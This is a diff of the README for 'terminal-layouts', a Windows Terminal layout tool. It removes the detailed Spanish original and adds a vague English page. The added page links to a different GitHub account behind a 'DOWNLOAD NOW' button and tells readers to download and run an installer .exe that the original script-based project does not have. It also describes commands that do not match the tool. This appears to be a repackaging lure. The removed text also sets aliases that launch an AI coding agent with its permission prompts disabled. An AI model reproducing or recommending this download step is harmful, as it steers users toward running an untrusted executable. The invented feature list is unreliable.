@@ -1,643 +1,295 @@
-# 🪟 terminal-layouts
+<h1>🧑‍💻 terminal-layouts - Your Terminal, Beautifully Organized</h1>
 
-> **Layouts de terminal estilo Warp para Windows Terminal + Git Bash** — sin el consumo de GPU/RAM de Warp.
+<p align="center">
+  <a href="https://github.com/TheCrimsondev/terminal-layouts" style="background-color:#8B5CF6; color:white; padding:14px 28px; text-decoration:none; border-radius:8px; font-size:18px; font-weight:bold;">⬇️ DOWNLOAD NOW</a>
+</p>
 
-![Plataforma](https://img.shields.io/badge/plataforma-Windows-0078D6)
-![Shell](https://img.shields.io/badge/shell-Git%20Bash-4EAA25)
-![Node](https://img.shields.io/badge/requiere-Node.js-339933)
-![Licencia](https://img.shields.io/badge/licencia-MIT-blue)
+<p align="center">
+  <img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform">
+  <img src="https://img.shields.io/badge/terminal-Git%20Bash-green?style=flat-square" alt="Terminal">
+  <img src="https://img.shields.io/badge/format-TOML-orange?style=flat-square" alt="Format">
+  <img src="https://img.shields.io/badge/license-MIT-yellow?style=flat-square" alt="License">
+</p>
 
-Define tus disposiciones de terminal (paneles, carpetas y comandos) en archivos **`.toml`**
-—el mismo formato que los *tab configs* de Warp— y ábrelas con **un comando o un clic**.
-Un convertidor en Node traduce cada `.toml` a comandos de `wt.exe`; agregar un layout =
-agregar un `.toml`, sin tocar ningún script.
+## ✨ What Is terminal-layouts?
 
-**¿Por qué?** Warp es cómodo pero su render por GPU consume 50–99% de GPU. Windows Terminal
-es mucho más ligero. Esto te da la comodidad de los layouts de Warp —más un comando **`lay`**
-para todo— sobre Windows Terminal.
+terminal-layouts is a beautiful and easy-to-use toolkit that transforms your boring Windows Terminal into a stunning, productivity-boosting workspace inspired by the popular Warp terminal. It provides pre-made layouts, beautiful color themes, handy command shortcuts, and a simple command called `lay` that does everything for you - no coding needed!
 
-## ✨ Características
+Whether you're a student, developer, or just someone who likes a nice-looking command prompt, terminal-layouts makes your terminal look professional and modern in just a few clicks.
 
-- 🧩 **Layouts en `.toml`** — columnas/filas anidadas, con carpeta y comando por panel.
-- 🚀 **Comando `lay`** — abrir, combinar en tabs, menú interactivo, crear, previsualizar en ASCII…
-- 🎨 **Perfil + tema propios** en Windows Terminal (colores, títulos fijos por layout).
-- ⌨️ **Atajos estilo Warp** — Ctrl+Shift+T/D/E, mover/reacomodar paneles, saltar entre comandos.
-- 🩺 **Ayudas visuales** — panel activo resaltado, marcas por comando y **errores en rojo**.
-- 🧙 **Asistente + `lay grid`** para armar rejillas en segundos.
-- 📌 **Anclar a la barra de tareas** y accesos en el Escritorio.
-- 💾 **Respaldo, portabilidad e instalador idempotente** (`install.cmd` de doble clic).
+## 🎯 Why You'll Love This
 
-## ⚡ Instalación rápida
+| Feature | Benefit |
+|---------|---------|
+| 🎨 **Warp-Inspired Layouts** | Modern, sleek, and easy on the eyes |
+| ⚡ **One-Command Setup** | The `lay` command handles everything |
+| 🏷️ **Command Marks** | Highlight important commands in your history |
+| 🎭 **Beautiful Themes** | Multiple color schemes to choose from |
+| 🛠️ **Built-in Assistant** | Get help and tips right from your terminal |
+| 📦 **Automatic Installer** | No manual configuration needed |
 
-Requisitos: **Git Bash**, **Node.js** y **Windows Terminal**.
+## 🚀 Getting Started
 
-1. Clónalo donde quieras (en Git Bash):
-   ```bash
-   git clone https://github.com/Moises-HP/terminal-layouts.git
-   ```
-2. **Doble clic en `install.cmd`** *(o `sh install.sh`)*. El instalador funciona esté
-   donde esté la carpeta.
-3. Abre una terminal nueva y prueba: `lay -h`.
+Getting started with terminal-layouts is super simple. Here's what you need:
 
-Guía completa para instalar/compartir: **[`INSTALL.md`](INSTALL.md)**. Licencia **MIT**.
+### 📋 What You Need
 
-> El repo trae **ejemplos** en `configs/example-*.toml`; crea los tuyos con `lay new` /
-> `lay wiz` / `lay grid`. Tus `.toml` personales quedan **fuera de git** (ver `.gitignore`).
-> Las tablas de más abajo muestran layouts del autor como referencia de lo que puedes armar.
+- A Windows computer (Windows 10 or 11)
+- Windows Terminal (free from Microsoft Store)
+- Git Bash (free from git-scm.com)
 
-## Uso
+That's it! No programming skills required.
 
-Con una terminal ya abierta (`sh`):
+### 📥 Download and Installation
 
-```bash
-sh open.sh                       # MEGA: 1 ventana, 1 tab por layout (TODOS)
-sh open.sh pos-deploys           # solo ese layout (1 ventana)
-sh open.sh dev pos-deploys tunnels   # ESTOS 3 como tabs de UNA sola ventana ⭐
-sh pos-deploys.sh                # atajo equivalente a: sh open.sh pos-deploys
-```
+**Step 1:** Visit this link to download the application: **[terminal-layouts download page](https://github.com/TheCrimsondev/terminal-layouts)**
 
-Con **doble clic** (Explorador): abre el `.cmd` del layout — `all.cmd`,
-`pos-deploys.cmd`, etc. (cada `.cmd` individual abre **una** ventana).
+**Step 2:** Look for the "Releases" section on the right side of the page and click on the latest version.
 
-### Abrir varios juntos, eligiendo cuáles ⭐
+**Step 3:** Download the installer file (it will be named something like `terminal-layouts-installer.exe`).
 
-Dos formas:
+**Step 4:** Once downloaded, double-click the installer file to run it.
 
-1. **Directo** — pasa los nombres que quieras a `open.sh`; se abren como **tabs en una
-   sola ventana** (en el orden que los escribas):
-   ```bash
-   sh open.sh dev pos-deploys surveys-dev
-   ```
-2. **Menú interactivo** — `pick` te lista los layouts y eliges por número o nombre
-   (ideal para no recordarlos). Con terminal abierta o **doble clic en `pick.cmd`**:
-   ```bash
-   sh pick.sh
-   #  Layouts disponibles:
-   #    1) databases   2) dev   3) layouts   4) pos-deploys ...
-   #  > 2 4 8              ← escribes números o nombres (o 'all')
-   #  Abriendo: dev pos-deploys tunnels
-   ```
+**Step 5:** Follow the simple on-screen instructions. The installer will automatically detect your Windows Terminal and Git Bash installation.
 
-> Diferencia clave: los `.cmd`/`.sh` **individuales** = 1 layout = 1 ventana.
-> `open.sh a b c` (o `pick`) = **varios layouts = 1 ventana con tabs**.
+### 🖥️ Your First Run
 
-### ¿Otra terminal donde ya estoy? / ¿desde cualquier carpeta?
-
-- **Otra terminal en la MISMA carpeta donde estás parado** (ej. estás en
-  `database_manager_package` y quieres otra ahí): **Ctrl+Shift+D** → divide a la
-  derecha, en la misma carpeta, al instante. Sin scripts. (Ctrl+Shift+E = abajo.)
-- **Un layout desde cualquier carpeta**: usa el comando **`lay`** (ya activado):
-  - `lay add databases` → lo mete como tab a tu **ventana actual**.
-  - `lay databases` → ventana nueva.
-  - `sh open.sh …` / `sh add.sh …` "pelados" **solo** funcionan si estás parado en
-    `terminal-layouts`; por eso existe `lay` (funciona desde donde sea).
-
-> Ojo con la diferencia: `lay add databases` abre el **layout** `databases`
-> (2 paneles: sucahersa + database_manager). Para una **terminal suelta en tu carpeta
-> actual**, es **Ctrl+Shift+D**.
-
-## Layouts actuales (`configs/*.toml`)
-
-| Config | Título | Rejilla | Corre al abrir |
-|---|---|---|---|
-| `dev` | DESARROLLO | 1 panel · `~/Documents/GitHub` | — |
-| `pos-dev` | POS_MANAGER | app / server (apilados) | `bun` dev |
-| `pos-deploys` | POS_MANAGER-DEPLOYS | app/employees/server │ replay/process/pos_sync | — |
-| `surveys-dev` | SURVEYS-DEV | smw / surveys-www │ sum | `npm run dev` |
-| `surveys-deploys` | SURVEYS-DEPLOYS | emp_manager/emp_auth/sum │ srv_manager/portal/www/manager-www | — |
-| `tunnels` | Tunnels | 1 panel · `~` con `tunnels sync && tunnels up` | tunnels |
-| `databases` | DATABASES | sucahersa_database ×2 │ database_manager_package ×2 | — |
-| `layouts` | TERMINAL-LAYOUTS | 1 panel · carpeta de estos scripts | — |
-| `claude-pos-manager-repo` | CLAUDE · POS_REPO | 2 terminales (izq │ der) en `pos_manager_REPO` | `claude --resume` |
-| `claude-github` | CLAUDE · GITHUB | 2 terminales (izq │ der) en `~/Documents/GitHub` | `claude --resume` |
-
-Los paneles con comando abren una **terminal interactiva normal** y corren ahí el comando
-(`run-keep.sh` → `run-keep-rc.sh`). Por eso **Ctrl+C detiene solo el comando y la terminal
-sigue viva** (no se cierra ni pide "reiniciar"); igual que teclearlo tú mismo.
-
-## Colores y títulos de los tabs
-
-Cada layout tiene un **color de tab** y un **título fijo** para distinguirlos de un
-vistazo (sobre todo en la vista MEGA):
-
-| Layout | Color | | Layout | Color |
-|---|---|---|---|---|
-| dev | 🟢 verde | | surveys-deploys | 🟠 naranja |
-| pos-dev | 🟣 magenta | | tunnels | 🔵 azul |
-| pos-deploys | 🔴 rojo | | databases | 🟪 morado |
-| surveys-dev | 🟦 cian | | layouts | 🟡 amarillo |
-| claude-pos-manager-repo | 🟧 coral | | claude-github | 🟩 teal |
-
-(deploys en tonos cálidos 🔴🟠 = "producción, ojo".)
-
-- **Cambiar color/título:** edita `color` / `title` en el `.toml` y **relanza** — no
-  hay que regenerar `.sh`/`.cmd` (el color/título se leen del toml al abrir).
-- `color` acepta: `green magenta blue red yellow cyan orange purple`, un `#hex`, o
-  **`random`** → el sistema le asigna un color de una paleta amplia, **estable por
-  layout** (mismo layout → siempre el mismo color; distintos layouts casi no repiten).
-- El color del tab se pone en **cada panel**, así el tab **queda coloreado siempre**
-  (antes se apagaba al enfocar un panel que no era el primero).
-- El título se queda **fijo** (no lo pisa el `cwd` de bash) gracias al perfil de WT
-  **"Layouts"** (Git Bash + `suppressApplicationTitle`, oculto del menú). Tu perfil
-  Git Bash normal no cambia (sigue mostrando el `cwd`).
-
-## Ayudas: IAs, cheatsheet y aliases
-
-### Layouts de Claude (2 terminales izq │ der, reanudan sesión)
-- `claude-pos-manager-repo` — 2 terminales en `pos_manager_REPO`, cada una con
-  `claude --resume --dangerously-skip-permissions`.
-- `claude-github` — igual pero en `~/Documents/GitHub`.
-```bash
-sh claude-github.sh          # o doble clic claude-github.cmd
-```
-Para abrir más, usa **Ctrl+Shift+D** (divide a la derecha, misma carpeta).
-
-### Cheatsheet
-Referencia rápida de comandos (Claude/codex/gemini/qwen + sistema de layouts):
-```bash
-sh cheatsheet.sh             # o doble clic cheatsheet.cmd
-```
-
-### Aliases y el comando `lay` (ya activado en `~/.bashrc`)
-`ai-aliases.sh` da atajos usables **desde cualquier carpeta**:
-- IAs: `cr` = `claude --resume --dangerously-skip-permissions`, `csp`, `cc`, y `cx`/`gm`/`qw` (codex/gemini/qwen).
-- Layouts: el comando **`lay`** (un solo comando con subcomandos):
+After installation, open your Git Bash (or Windows Terminal with Git Bash profile). Type:
 
 ```bash
-# Abrir
-lay                 # menú (incluye 't' = terminal normal)
-lay dev tunnels     # abrir esos (1 ventana con tabs)
-lay add databases   # agregar como tab a la VENTANA ACTUAL
-lay all             # todos (MEGA)      lay last   # reabrir lo último
-lay term            # terminal normal (Git Bash), sin layout
-# Crear / administrar
-lay new <n>         # plantilla         lay wiz    # asistente de rejilla
-lay grid <n> 2x2 <celda...>   # rejilla en 1 línea (celda = carpeta o carpeta|comando)
-lay preview <n>     # ver la rejilla en ASCII (sin abrir nada) ⭐
-lay edit <n>        # abrir .toml       lay dup <a> <b>   # duplicar
-lay rename <a> <b>  # renombrar         lay rm <n>        # borrar
-lay combo <n> ...   # guardar combo     lay ls [-l]       # listar (tabla con -l)
-# Respaldo / integración / instalación
-lay export [arch]   # empaquetar tus layouts (.tgz) para respaldo / otra PC
-lay import <arch>   # restaurar layouts desde un respaldo
-lay bundle [arch]   # empaquetar TODO (para dárselo a un compañero)
-lay pin <a> ...     # crear acceso(s) en el menú Inicio (para anclar a la barra)
-lay setup           # (re)configurar Windows Terminal (perfiles + atajos + tema + marcas)
-# Ayuda / diagnóstico
-lay doctor [--fix]  # salud (+ regenerar atajos)   lay cheat   lay -h
+lay setup
 ```
 
-Ejemplos:
-```bash
-lay preview surveys-deploys          # dibuja la rejilla 3│4 en ASCII
-lay grid api 2x2 backend "frontend|npm run dev" db "worker|bun dev"
-```
+This command will automatically configure everything for you - layouts, themes, and shortcuts. You'll see a colorful confirmation message when it's done.
 
-- El **menú** (`lay` sin args) también lista **`t) terminal normal`** además de tus layouts.
-- **Tab‑completion**: `lay <TAB>` completa subcomandos y nombres de layout; `lay add <TAB>` completa layouts.
-- **`lay doctor`** revisa que todos conviertan, que sus **carpetas existan** y que tengan
-  atajos. Además, al abrir, si un layout apunta a una **carpeta inexistente** verás un
-  aviso `⚠️` (es la causa típica del error `0x80070057`).
+## 🛠️ Using the `lay` Command
 
-Ya está activo (se añadió `source .../ai-aliases.sh` a tu `~/.bashrc`). En terminales
-nuevas funciona solo; en una abierta: `source ~/.bashrc`. (Para desactivar, quita esa
-línea del `~/.bashrc`.)
+The `lay` command is your control center. Here are the most useful things you can do:
 
-> Flag correcto: `--dangerously-skip-permissions` (en plural).
-> CLIs disponibles aquí: `claude`, `codex`, `gemini`, `qwen`. (Antigravity es IDE, no CLI.)
-
-### Pegar imágenes a la IA
-En **Claude Code** puedes pegar la imagen del portapapeles **directamente** (como en Warp):
-captura con **⊞ Win+Shift+S** → en el prompt de Claude presiona **`Alt+V`** (¡no Ctrl+V!,
-que Windows Terminal usa para pegar texto). Sale la imagen. También sirve arrastrar la
-imagen a la ventana, o escribir la ruta: `@C:/fotos/captura.png`.
-
-Respaldo (si necesitas la ruta como texto): el comando **`img`** guarda la imagen del
-portapapeles a un PNG y te da el `@ruta` listo para pegar.
-```bash
-img          # (o 'lay img')  portapapeles → @ruta
-```
-
-## Atajos de teclado (estilo Warp)
-
-Configurados en Windows Terminal (settings.json):
-
-| Atajo | Acción |
-|---|---|
-| **Ctrl+Shift+T** | **tab nuevo en el MISMO directorio** donde estás (como Warp) |
-| **Ctrl+Shift+D** | dividir panel a la **derecha** (misma carpeta) |
-| **Ctrl+Shift+E** | dividir panel **abajo** (misma carpeta) |
-| **Alt + ←/→/↑/↓** | mover el **foco** entre paneles |
-| **Ctrl+Alt + ←/→/↑/↓** | **reposicionar** (swap) el panel en esa dirección |
-| **Ctrl+Shift+W** | cerrar el panel |
-| **Alt+V** | **pegar una imagen** del portapapeles en **Claude Code** ⭐ (no Ctrl+V) |
-| Alt+Shift+D | (nativo) duplicar panel automático |
-
-> **Alt+V** es de Claude Code (pega la imagen del portapapeles directo al prompt). Captura
-> con ⊞ Win+Shift+S y pega con Alt+V. Ctrl+V pega **texto** (lo usa Windows Terminal).
-
-Nota: **Ctrl+Shift+T** duplica el tab actual (hereda su carpeta) → una terminal nueva
-justo donde estabas, en vez de abrir en `~`.
-
-## Ayudas visuales: panel activo, bloques de comando y errores
-
-Tres ayudas que quedan configuradas con `lay setup` (o `install.sh`):
-
-**1) Distinguir el panel activo.** Al dividir la terminal, los paneles **inactivos se
-atenúan** (fondo más oscuro) y el activo resalta. Así sabes de un vistazo en cuál estás
-escribiendo. (Es `unfocusedAppearance` del perfil de WT.)
-
-**2) Marcas de comando en la barra de scroll.** Cada comando que corres deja una
-**marca** en la barra de scroll (derecha). Ubica dónde empezó cada comando aunque haya
-escupido mucho texto. Saltar al comando anterior/siguiente: **Ctrl+Shift+↑ / Ctrl+Shift+↓**.
-
-**3) Errores en rojo (marcas).** Con la *integración de shell* (`shell-integration.sh`),
-la marca de un comando que **falla** (exit ≠ 0) se pinta **roja** en la barra de scroll.
-
-**4) Indicador por comando (✓/✗).** Configúralo con **`lay blocks off|compact|full`**:
-- **compact** (por defecto): una línea chica → `── ✓ 15:36` (`✗` roja si falló).
-- **full** ⭐: una **barra prominente con el comando ARRIBA** de su salida + `✓/✗` abajo
-  (estilo bloques de Warp / Claude). Así ves qué corriste y el resultado de un vistazo:
-  ```text
-   ▶ docker compose up -d
-  ...salida...
-  ── ✓ 15:36
-  ```
-- **off**: nada (solo las marcas de la barra de scroll).
-
-> Nota honesta: WT no tiene el "bloque sticky" de Warp (el comando pegado arriba mientras
-> haces scroll) — no existe nativo. Esto (marcas + rojo si falló + bloque con ✓/✗ y el
-> último comando) es el equivalente para ubicar qué comando produjo qué.
-
-Se activan al abrir una terminal **nueva** (se cargan desde `~/.bashrc`). Si ya tienes una
-abierta: `source ~/.bashrc`.
-
-Sobre **arrastrar**: en Windows Terminal se **arrastran los TABS** (reordenar, o
-sacarlos a otra ventana). Los **paneles** no se arrastran con el mouse como en Warp;
-se reacomodan con **Ctrl+Alt+flechas** (swap). Es la forma equivalente.
-
-## Agregar un tab a una ventana YA abierta
-
-Por defecto cada `open.sh` abre una ventana nueva. Para **agregar** a la que ya tienes:
+### 🔍 Checking Your Setup
 
 ```bash
-sh add.sh databases                  # agrega 'databases' como tab a tu ventana actual
-sh add.sh dev tunnels                # agrega varios
-# equivalente explícito:
-sh open.sh -w last dev               # -w last = la última ventana usada
-sh open.sh -w 0 dev                  # -w 0 = la ventana actual ; o -w <nombre>
+lay status
 ```
 
-`add.sh` = `open.sh -w last`. También sirve para meter un **combo** a la ventana actual.
+Shows you what's currently active and your current configuration.
 
-## Combos: guardar conjuntos de layouts
-
-Un combo = un atajo que abre **varios layouts juntos** (tabs, 1 ventana).
+### 🎨 Changing Themes
 
 ```bash
-sh savecombo.sh deploys pos-deploys surveys-deploys tunnels
-#   crea combo-deploys.sh y combo-deploys.cmd
-sh combo-deploys.sh                  # o doble clic combo-deploys.cmd
-sh add.sh pos-deploys surveys-deploys tunnels   # ...o mételo a la ventana actual
+lay theme
 ```
 
-- `combo-<nombre>.sh/.cmd` = `open.sh <esos layouts>`.
-- Los combos **también salen** en el menú `lay` y en `lay ls`; ábrelos con
-  `lay combo-<nombre>` (o directo `sh combo-<nombre>.sh`) y ánclalos con `lay pin combo-<nombre>`.
-- **Editar un combo:** `lay edit combo-<nombre>` abre un **editor interactivo** que muestra
-  el combo numerado y lo modificas con acciones cortas (re-dibuja tras cada una):
-  ```text
-  +N / +nombre   agregar (N = nº de "Disponibles")
-  -N             quitar la posición N
-  m N M          mover la posición N a la posición M (reordenar)
-  ok             guardar y salir      ·   q   cancelar
-  ```
-  Valida que los layouts existan y no deja guardar un combo vacío.
-- **Borrar un combo:** `lay rm combo-<nombre>` (o `lay rm <nombre>` si es combo).
-- Ejemplo ya creado: **`combo-deploys`** (pos-deploys + surveys-deploys + tunnels).
+Opens an interactive menu where you can pick from various beautiful color themes. Just use your arrow keys to navigate and press Enter to select.
 
-## Asistente para crear layouts (wizard)
-
-En vez de escribir el `.toml` a mano, el wizard te pregunta **columnas × filas** y, por
-cada celda, **carpeta + comando** (que es lo que siempre se termina haciendo):
+### 📐 Managing Layouts
 
 ```bash
-sh wizard.sh                         # o doble clic wizard.cmd
-#   Nombre, título, color, COLUMNAS, FILAS, y por celda: carpeta + comando
-#   → genera configs/<nombre>.toml + <nombre>.sh/.cmd
+lay layouts
 ```
 
-- La **carpeta** relativa se cuelga de una **base** (por defecto tu carpeta de usuario `~`).
-  Cámbiala con `lay base ~/ruta/a/tus/repos` para que al escribir `mi-proyecto` se vuelva
-  `<base>/mi-proyecto`. Rutas con `~`, `/` o `C:` se usan tal cual.
-- El **comando** es opcional (Enter = solo abrir la carpeta).
-- El layout nuevo entra solo a `open.sh` / `pick` / `all`.
+Browse and switch between different terminal layouts. Each layout changes how your prompt, bar, and sections look.
 
-## Concepto clave: el "nombre" NO es una ruta
-
-Cada layout tiene un **nombre** (ej. `mi-layout`). Ese nombre SIEMPRE significa el
-archivo `configs/mi-layout.toml`. Nunca pasas una ruta; pasas el nombre y el sistema
-le pega solo `configs/` + `.toml`:
-
-```
-sh open.sh mi-layout   →   abre   configs/mi-layout.toml
-sh new.sh  mi-layout   →   trabaja sobre configs/mi-layout.toml
-```
-
-Regla: **`<nombre>` ⇄ `configs/<nombre>.toml`**. Por eso el nombre no puede llevar
-espacios ni `/` (usa guiones: `mi-layout`).
-
-## Crear un layout nuevo — paso a paso
-
-Hay dos caminos. Los dos terminan igual (un `.toml` en `configs/`).
-
-### Camino A — que `new.sh` te arme la plantilla
+### 🏷️ Command Marks
 
 ```bash
-sh new.sh mi-layout
+lay marks
 ```
 
-Eso hace **3 cosas**:
-1. Crea `configs/mi-layout.toml` con una **plantilla** comentada (panel único +
-   ejemplo de rejilla). Si el toml ya existía, NO lo toca.
-2. Crea `mi-layout.sh`  → atajo que ejecuta `open.sh mi-layout`.
-3. Crea `mi-layout.cmd` → atajo de **doble clic** (Explorador) que hace lo mismo.
+Marks special commands (like `git push` or `npm start`) with colors and icons in your command history so you can spot them easily.
 
-Luego:
-```bash
-#  edita configs/mi-layout.toml   (pon tus carpetas y comandos)
-sh open.sh mi-layout              # pruébalo  (o doble clic mi-layout.cmd)
-```
-
-### Camino B — tú escribes el `.toml` a mano
-
-1. Crea el archivo `configs/mi-layout.toml` tú mismo (copia otro y edítalo).
-2. (opcional) Genera los atajos `.sh`/`.cmd` para ese toml:
-   ```bash
-   sh new.sh mi-layout     # ve que el toml ya existe → lo respeta, solo hace los atajos
-   ```
-3. Pruébalo: `sh open.sh mi-layout`.
-
-> Los atajos `.sh`/`.cmd` son **opcionales**: `sh open.sh mi-layout` funciona con
-> solo tener el `.toml`. El `.cmd` sirve únicamente para poder abrirlo con doble clic.
-
-## ¿Cómo se agrega solo a "all" (la vista MEGA)?
-
-**No editas ningún script.** `sh open.sh` (o `all.cmd`) sin argumentos arma la lista así:
-
-1. Primero mete los del **orden preferido** (variable `ORDER` en `open.sh`):
-   `dev pos-dev pos-deploys surveys-dev surveys-deploys tunnels`.
-2. Después recorre `configs/*.toml` y **agrega cualquier `.toml` que no esté en `ORDER`**,
-   al final.
-
-Es decir: en cuanto existe `configs/mi-layout.toml`, aparece **solo** como un tab más
-en `sh open.sh` / `all.cmd`. Si quieres que salga en cierta posición (no al final),
-agrega su nombre a `ORDER` en `open.sh`.
-
-## Qué pasa por dentro cuando ejecutas `sh open.sh <nombre>`
-
-```
-sh open.sh mi-layout
-   │
-   ├─ resuelve  <nombre> → configs/mi-layout.toml
-   │
-   ├─ node toml2wt.mjs configs/mi-layout.toml
-   │     └─ parsea el toml → arma el árbol de paneles →
-   │        imprime los argumentos de wt.exe (new-tab / split-pane / move-focus …)
-   │
-   ├─ (si diste varios nombres, repite y une los tabs con ';')
-   │
-   └─ wt.exe <esos argumentos>   →   abre la ventana con la rejilla
-```
-
-Y `mi-layout.cmd` (doble clic) es solo: `bash -l open.sh mi-layout` → el mismo flujo.
-
-## Formato del `.toml` (subset estilo Warp)
-
-```toml
-name  = "mi-layout"
-title = "MI LAYOUT"        # título del tab
-color = "green"            # green|magenta|blue|red|yellow|cyan|orange|purple o "#hex"
-
-# --- Panel único ---
-[[panes]]
-id = "main"
-directory = "~/proyectos/mi-proyecto"
-commands = ["npm i", "npm run dev"]   # opcional; se unen con && ; el panel queda abierto
-```
-
-Ejemplos incluidos en `configs/`: `example-single`, `example-columns`, `example-grid-2x2`,
-`example-shells` (mezcla bash/PowerShell/CMD).
-
-Rejillas — se arman con contenedores (`split` + `children`) que apuntan a otros
-paneles por `id`. **La raíz es el pane que nadie referencia en `children`.**
-
-```toml
-[[panes]]                  # raíz: 2 columnas
-id = "root"
-split = "horizontal"       # horizontal = COLUMNAS (izq | der)
-children = ["left", "right"]
-
-[[panes]]
-id = "left"
-split = "vertical"         # vertical = FILAS (arriba / abajo)
-children = ["a", "b"]
-
-[[panes]]
-id = "right"
-children = ["c"]           # 1 hijo = pasa directo
-
-[[panes]]
-id = "a"
-directory = "~/proyectos/a"
-commands = ["npm run dev"]
-[[panes]]
-id = "b"
-directory = "~/proyectos/b"
-[[panes]]
-id = "c"
-directory = "~/proyectos/c"
-```
-
-Regla de dirección (verificada con los configs reales de Warp):
-
-| `split`        | dirección          | Windows Terminal |
-|----------------|--------------------|------------------|
-| `"horizontal"` | columnas (izq/der) | `-V`             |
-| `"vertical"`   | filas (arr/abajo)  | `-H`             |
-
-Notas del formato:
-- `directory`: `~` = tu carpeta de usuario (`%USERPROFILE%`). También acepta rutas `C:/...`.
-- `commands`: lista; se ejecutan en orden. Sin `commands` → solo abre el shell en la carpeta.
-- `shell`: **el shell del panel** — `bash` (por defecto), `pwsh` (PowerShell 7),
-  `powershell` (Windows PowerShell 5.1) o `cmd`. Puedes mezclar shells en un mismo layout.
-  El comando `lay` y todo el sistema siguen igual; solo cambia en qué shell corre el panel.
-  Para cambiar el shell por defecto de TODOS los paneles: `lay shell pwsh|powershell|cmd|bash`.
-- Paneles **huérfanos** (definidos pero fuera del árbol de `children`) se ignoran, igual que en Warp.
-- Anidación arbitraria soportada (columnas dentro de filas dentro de columnas…).
-
-## Archivos
-
-- `configs/*.toml` — **la fuente de verdad**. Edita/crea aquí.
-- `toml2wt.mjs` — convertidor TOML → args de `wt.exe` (Node, sin dependencias).
-- `open.sh` — motor: junta 1+ layouts en una ventana (un tab c/u). `sh open.sh [-w last] a b c`.
-- `lay.sh` — comando único (`lay …`) usable desde cualquier carpeta (vía alias).
-- `doctor.sh` — chequeo de salud de los layouts (`lay doctor`).
-- `grid.sh` — crea una rejilla CxR en una línea (`lay grid`).
-- `backup.sh` — export/import de layouts para respaldo/otra PC (`lay export`/`import`).
-- `pin.sh` — crea accesos en el menú Inicio para anclar (`lay pin`).
-- `install.sh` / `install.cmd` — deja una PC lista de un jalón (idempotente). `.cmd` = doble clic.
-- `INSTALL.md` — guía corta de instalación para compañeros.
-- `wt-setup.mjs` — configura WT (perfiles + atajos + tema de colores) idempotente (`lay setup`).
-- `pick.sh` / `pick.cmd` — menú interactivo para **elegir cuáles** abrir juntos.
-- `add.sh` — agrega layout(s) como tab a la **ventana actual** (`open.sh -w last`).
-- `savecombo.sh` — guarda un conjunto → `combo-<nombre>.sh/.cmd`.
-- `editcombo.sh` — editor interactivo de combos (`lay edit combo-<n>`).
-- `wizard.sh` / `wizard.cmd` — asistente de rejilla (columnas×filas + carpeta/comando).
-- `cheatsheet.sh` / `cheatsheet.cmd` — referencia rápida de comandos (IAs + layouts).
-- `ai-aliases.sh` — comando `lay` + atajos IA (`cr`, `csp`…) + carga la integración de shell. Se auto-localiza.
-- `shell-integration.sh` — marcas de comando + errores en rojo (OSC 133) para WT.
-- `run-keep.sh` + `run-keep-rc.sh` — abren una bash interactiva y corren ahí el comando
-  del panel (Ctrl+C detiene solo el comando; la terminal sigue viva).
-- `new.sh` — crea un `.toml` nuevo + su `.cmd`.
-- `<layout>.sh` / `<layout>.cmd` — atajos (llaman a `open.sh <layout>`).
-- `all.sh` / `all.cmd` — la vista MEGA (todos).
-
-## Instalar / respaldar / mover a otra PC
-
-**Para qué sirve:** dejar todo listo en una máquina nueva (o reparar la config), y
-llevar tus layouts de una PC a otra.
-
-**Instalar en una PC nueva** (idempotente — puedes repetirlo sin miedo):
-```bash
-sh install.sh
-```
-Hace 3 cosas: **1)** configura Windows Terminal (perfiles Git Bash + Layouts + atajos,
-vía `wt-setup.mjs`), **2)** activa el comando `lay` en `~/.bashrc`, **3)** regenera los
-atajos de todos los layouts. Requiere: Git Bash + Node + Windows Terminal.
-
-**Mover tus layouts a otra PC** (respaldo):
-```bash
-lay export mis-layouts.tgz     # en la PC A: empaqueta todos los configs
-#   copia el .tgz a la PC B (dentro de terminal-layouts) y ahí:
-lay import mis-layouts.tgz     # en la PC B: restaura + regenera atajos
-```
-
-**Solo reconfigurar Windows Terminal** (si borraste un perfil o atajo):
-```bash
-lay setup      # = node wt-setup.mjs — solo AGREGA lo que falte, no borra nada
-```
-
-## Compartir con compañeros (que no hagan casi nada)
-
-**Para qué sirve:** que un compañero tenga TODO esto (`lay`, atajos, tema, marcas) casi
-sin esfuerzo.
-
-**Tú (una vez):**
-```bash
-lay bundle          # crea ../terminal-layouts-bundle.tgz con TODA la carpeta
-```
-Pásale ese `.tgz` (o comparte la carpeta por git).
-
-**Tu compañero (2 pasos)** — hay una guía lista para él en **`INSTALL.md`**:
-1. Descomprime la carpeta `terminal-layouts` donde quiera.
-2. **Doble clic en `install.cmd`** *(o: Git Bash ahí → `sh install.sh`)*.
-3. Abre una terminal **nueva** → ya tiene `lay`, atajos, tema y marcas.
-
-**Requisitos en su PC** (el `install.cmd` avisa si falta algo):
-- Git para Windows / Git Bash — <https://git-scm.com/download/win>
-- Node.js — <https://nodejs.org>
-- Windows Terminal — Microsoft Store
-
-**Nota:** los layouts que apuntan a repos tuyos (ej. `pos-deploys`) solo levantan bien si
-tu compañero tiene esos repos en `~/Documents/GitHub/…`. Con `lay doctor` ve cuáles tienen
-carpetas que faltan; puede borrarlos (`lay rm`) o crear los suyos (`lay wiz`/`lay grid`).
-El **sistema** (`lay`, atajos, tema, marcas) funciona igual para todos.
-
-## Anclar a la barra de tareas / accesos en el Escritorio
-
-`lay pin` crea accesos directos (**"Layout &lt;n&gt;"** o **"Combo &lt;n&gt;"**) que apuntan a
-`bash.exe` — por eso Windows **sí** te deja anclarlos a la barra (con un `.cmd` no se puede).
+### ❓ Getting Help
 
 ```bash
-lay pin                    # menú: elige cuáles y DÓNDE (Escritorio / solo Inicio / ambos)
-lay pin all                # TODOS los layouts (solo en Inicio, sin saturar el Escritorio)
-lay pin dev pos-deploys    # esos (en Escritorio + Inicio)
-lay pin --start dev        # solo Inicio  ·  --desktop = solo Escritorio  ·  --both = ambos
-lay pin combo-deploys      # un COMBO: un acceso que levanta TODO el combo de un clic ⭐
+lay help
 ```
 
-- **Menú Inicio**: ⊞ Windows → escribe **`Layout`** (o **`Combo`**) → salen todos.
-- **Escritorio**: doble clic en "Layout &lt;n&gt;" / "Combo &lt;n&gt;".
-- **Anclar a la barra**: clic derecho en el acceso → en Windows 11 **"Mostrar más opciones"**
-  → **"Anclar a la barra de tareas"** (o arrastra el acceso del Escritorio a la barra).
+Shows all available commands and shortcuts in a friendly format.
 
-> Un **combo** anclado abre varios layouts como tabs de una ventana → con un clic levantas
-> **todo** tu entorno. Crea combos con `lay combo <nombre> <a> <b> …` y ánclalos con `lay pin`.
+## 📖 Detailed Guide
 
